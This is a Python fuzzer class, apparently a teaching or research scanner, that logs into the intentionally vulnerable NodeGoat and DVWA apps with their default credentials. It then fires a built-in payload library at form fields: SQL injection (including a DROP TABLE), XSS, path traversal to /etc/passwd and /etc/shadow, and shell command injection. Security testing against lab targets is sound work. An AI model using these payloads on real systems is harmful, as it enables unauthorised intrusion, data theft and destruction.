import requests
import time
from urllib.parse import urljoin


# NodeGoat default seeded account (created by its own db-reset).
NODEGOAT_USER = "user1"
NODEGOAT_PASS = "User1_123"


class Fuzzer:
    def __init__(self, base_url, username=None, password=None):
        self.base_url = base_url
        # Same tester-supplied credentials the crawler used, so fuzzing
        # requests are made under the same authenticated identity.
        self.username = username or None
        self.password = password or None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Scanner Research Tool)'
        })
        # Authenticate with whichever target we are pointed at, so the
        # fuzzing session can reach the protected pages.
        if self._is_nodegoat():
            self._login_nodegoat()
        else:
            self._login()
        self.payloads = self._load_payloads()

    def _is_nodegoat(self):
        url = self.base_url.lower()
        return ":4000" in url or ":3000" in url or "nodegoat" in url

    def _login_nodegoat(self):
        """Authenticate the fuzzing session with NodeGoat."""
        try:
            login_url = urljoin(self.base_url + "/", "login")
            response = self.session.get(login_url, timeout=10)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            token_field = soup.find('input', {'name': '_csrf'})
            csrf = token_field.get('value', '') if token_field else ''
            login_data = {
                'userName': self.username or NODEGOAT_USER,
                'password': self.password or NODEGOAT_PASS,
                '_csrf': csrf
            }
            resp = self.session.post(
                login_url,
                data=login_data,
                timeout=10,
                allow_redirects=False,
                headers={'Referer': login_url}
            )
            location = resp.headers.get('Location', '')
            last = location.rstrip('/').rsplit('/', 1)[-1]
            if resp.status_code in (301, 302, 303, 307, 308) and last != 'login':
                print(f"[+] Fuzzer authenticated to NodeGoat (-> {location})")
            else:
                dash = self.session.get(
                    urljoin(self.base_url + "/", "dashboard"),
                    timeout=10, allow_redirects=False)
                if dash.status_code == 200:
                    print("[+] Fuzzer authenticated to NodeGoat")
                else:
                    print("[!] WARNING: Fuzzer NodeGoat authentication failed.")
        except Exception as e:
            print(f"[!] Fuzzer NodeGoat login failed: {e}")

    def _login(self):
        """Re-authenticate session for fuzzing (DVWA)"""
        try:
            login_url = urljoin(self.base_url, '/login.php')
            response = self.session.get(login_url, timeout=10)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            token_field = soup.find('input', {'name': 'user_token'})
            token = token_field['value'] if token_field else ''
            login_data = {
                'username': self.username or 'admin',
                'password': self.password or 'password',
                'Login': 'Login',
                'user_token': token
            }
            self.session.post(login_url, data=login_data, timeout=10)
        except Exception as e:
            print(f"[!] Fuzzer login failed: {e}")

    def _load_payloads(self):
        """Context-aware payload library"""
        return {
            'sqli': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "'; DROP TABLE users; --",
                "' UNION SELECT null, username, password FROM users --",
                "1' AND SLEEP(3) --",
                "' OR 1=1 LIMIT 1 --",
                "admin'--",
                "' OR 'x'='x",
                "1; SELECT * FROM users",
                "' AND 1=2 UNION SELECT 1,2,3 --"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<<SCRIPT>alert('XSS')<</SCRIPT>",
                "<ScRiPt>alert('XSS')</ScRiPt>"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/etc/passwd",
                "../../etc/shadow",
                "../etc/passwd%00",
                "....//....//etc/passwd",
                "%2F%2F%2Fetc%2Fpasswd"
            ],
            'cmd_injection': [
                "-ls",
                "--ls",
                "; ls -la",
                "| ls -la",
                "&& ls -la",
                "& ls -la",
                "; ls",
                "| ls",
                "&& ls",
                "; whoami",
                "| whoami",
                "&& whoami",
                "; id",
                "| id",
                "&& id",
                "&& cat /etc/passwd",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "`whoami`",
                "$(whoami)",
                "`id`",
                "$(id)",
                "& dir",
                "| dir"
            ]
        }

    def _get_context(self, input_field):
        """Determine appropriate payload type based on input context.
        NOTE: 'name' is intentionally NOT an sqli keyword. DVWA's
        reflected-XSS field is literally called 'name', and NodeGoat's
        profile uses firstName/lastName -- routing those to XSS is what
        lets the scanner catch reflected/stored XSS on both targets."""
        name = input_field.get('name', '').lower()
        input_type = input_field.get('type', 'text').lower()
        if any(k in name for k in ['id', 'user', 'pass', 'search', 'query', 'q']):
            return 'sqli'
        elif any(k in name for k in ['comment', 'message', 'text', 'input', 'content', 'name', 'memo', 'title', 'address']):
            return 'xss'
        elif any(k in name for k in ['file', 'path', 'dir', 'folder', 'page', 'include']):
            return 'path_traversal'
        elif any(k in name for k in ['cmd', 'exec', 'command', 'run', 'ip', 'host']):
            return 'cmd_injection'
        else:
            return 'sqli'  # Default to SQLi for unknown fields

    def fuzz(self, endpoints):
        """Fuzz all discovered endpoints with context-aware payloads"""
        all_responses = []
        total = len(endpoints)

        for i, endpoint in enumerate(endpoints):
            print(f"[*] Fuzzing endpoint {i+1}/{total}: {endpoint['url']}")

            for input_field in endpoint['inputs']:
                context = self._get_context(input_field)
                payloads = self.payloads[context]

                baseline = self._send_request(
                    endpoint, input_field, 'normal_input', 'baseline'
                )

                for payload in payloads:
                    response_data = self._send_request(
                        endpoint, input_field, payload, context
                    )
                    if response_data:
                        response_data['baseline'] = baseline
                        all_responses.append(response_data)

        print(f"[*] Fuzzing complete. {len(all_responses)} responses collected")
        return all_responses

    def _send_request(self, endpoint, input_field, payload, payload_type):
        """Send a single request and record the response"""
        try:
            form_data = {}

            # Always replay the form's submit button and hidden fields
            # (e.g. Submit=Submit, CSRF _csrf/user_token) unmodified.
            for ef in endpoint.get('extra_fields', []):
                form_data[ef['name']] = ef['value']

            for field in endpoint['inputs']:
                if field['name'] == input_field['name']:
                    form_data[field['name']] = payload
                else:
                    form_data[field['name']] = field.get('value', 'test')

            start_time = time.time()

            if endpoint['method'] == 'POST':
                response = self.session.post(
                    endpoint['url'],
                    data=form_data,
                    timeout=15,
                    allow_redirects=True
                )
            else:
                response = self.session.get(
                    endpoint['url'],
                    params=form_data,
                    timeout=15,
                    allow_redirects=True
                )

            response_time = time.time() - start_time

            return {
                'url': endpoint['url'],
                'method': endpoint['method'],
                'input_field': input_field['name'],
                'payload': payload,
                'payload_type': payload_type,
                'status_code': response.status_code,
                'response_time': response_time,
                'content_length': len(response.content),
                'response_text': response.text,
                'headers': dict(response.headers)
            }

        except requests.exceptions.Timeout:
            return {
                'url': endpoint['url'],
                'input_field': input_field['name'],
                'payload': payload,
                'payload_type': payload_type,
                'status_code': 0,
                'response_time': 15.0,
                'content_length': 0,
                'response_text': '',
                'headers': {},
                'timeout': True
            }
        except Exception as e:
            print(f"[!] Request error: {e}")
            return None
